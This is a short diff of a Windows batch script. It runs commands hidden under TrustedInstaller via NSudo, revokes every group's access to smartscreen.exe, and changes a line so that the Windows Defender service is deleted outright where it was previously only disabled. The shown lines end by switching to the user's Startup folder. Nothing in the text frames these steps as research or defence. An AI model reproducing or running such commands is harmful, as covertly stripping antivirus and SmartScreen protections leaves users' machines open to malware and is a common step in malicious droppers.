@@ -73,7 +73,7 @@ set yop=System32
 NSudo.exe -U:T -ShowWindowMode:Hide icacls "%iop%\%yop%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
 
  
-NSudo.exe -U:T -ShowWindowMode:Hide  sc config  windefend  start= disabled
+NSudo.exe -U:T -ShowWindowMode:Hide  sc delete  windefend  
 
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
